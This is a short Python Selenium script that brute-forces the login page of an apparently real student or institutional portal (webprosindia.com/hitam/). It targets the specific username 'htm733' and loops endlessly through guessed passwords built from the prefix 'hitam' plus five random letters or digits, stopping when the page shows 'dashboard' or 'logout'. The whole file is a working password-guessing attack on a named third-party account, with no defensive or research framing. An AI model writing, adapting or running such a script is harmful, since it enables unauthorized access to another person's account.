from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import random
import string
import time

def generate_random_code():
    """Generate a random password with 'hitam' as the first five characters and a mix of alphabets or numbers."""
    prefix = "hitam"
    if random.choice([True, False]):
        suffix = ''.join(random.choices(string.ascii_letters, k=5))  # Purely alphabets
    else:
        suffix = ''.join(random.choices(string.digits, k=5))  # Purely numbers
    return prefix + suffix

def try_password():
    """Try entering random passwords until login is successful."""
    driver = webdriver.Chrome()  # Ensure you have the ChromeDriver installed
    driver.get("https://webprosindia.com/hitam/")
    time.sleep(5)  # Give time to manually focus on the username field
    
    username_element = driver.switch_to.active_element
    username_element.clear()
    username_element.send_keys("htm733")  # Enter username
    username_element.send_keys(Keys.TAB)  # Move to password field
    
    while True:
        try:
            code = generate_random_code()
            print(f"Trying code: {code}")
            
            active_element = driver.switch_to.active_element
            active_element.clear()
            active_element.send_keys(code)
            active_element.send_keys(Keys.RETURN)
            
            time.sleep(3)  # Wait for the response
            
            if "dashboard" in driver.page_source.lower() or "logout" in driver.page_source.lower():
                print(f"Login successful with code: {code}")
                break
        except Exception as e:
            print(f"Error occurred: {e}")
    
    driver.quit()

try_password()
